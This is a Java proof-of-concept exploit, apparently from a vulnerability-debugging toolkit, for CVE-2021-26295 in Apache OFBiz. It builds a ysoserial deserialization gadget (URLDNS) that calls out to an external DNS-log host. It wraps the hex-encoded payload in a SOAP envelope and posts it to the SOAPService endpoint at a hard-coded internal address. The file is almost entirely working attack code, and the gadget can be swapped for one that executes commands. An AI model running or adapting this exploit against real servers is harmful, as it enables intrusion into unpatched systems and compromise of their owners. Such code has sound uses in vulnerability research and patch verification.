package ofbiz.cve;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import com.pacemrc.vuldebug.common.utils.basic.ObjectUtil;
import com.pacemrc.vuldebug.common.utils.http.Response;
import org.apache.http.client.methods.HttpPost;
import ysoserial.payloads.ObjectPayload;

/**
 * affected version < 17.12.06
 */
public class CVE_2021_26295 {


    public static void main(String[] args) throws Exception {

        String url = "http://10.58.120.200:8080/webtools/control/SOAPService";
        String gadget = "URLDNS";
        String cmd = "http://2ytmgi6h.dnslog.pw";
        ObjectPayload<?> payload = (ObjectPayload) Class.forName("ysoserial.payloads." + gadget).newInstance();
        Object obj = payload.getObject(cmd);
        String hexString = ObjectUtil.ObjectToHexString(obj);
        System.out.println(hexString);

        String xmlTemplate = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header/><soapenv:Body><ser><map-HashMap><map-Entry><map-Key><cus-obj>CUSOBJ</cus-obj></map-Key><map-Value><std-String value=\"STDSTRING\"/></map-Value></map-Entry></map-HashMap></ser></soapenv:Body></soapenv:Envelope>";
        String body = xmlTemplate.replace("CUSOBJ", hexString).replace("STDSTRING", cmd);
        HttpRequest httpRequest = new HttpRequest("127.0.0.1", 8080);
        HttpPost httpPost = new HttpPost(url);
        httpPost.addHeader("Content-Type","application/xml");
        Response response = httpRequest.sendStringPost(httpPost, body);
        System.out.println(response.getStatusCode());
        System.out.println(response.getResponseBody());
    }
}
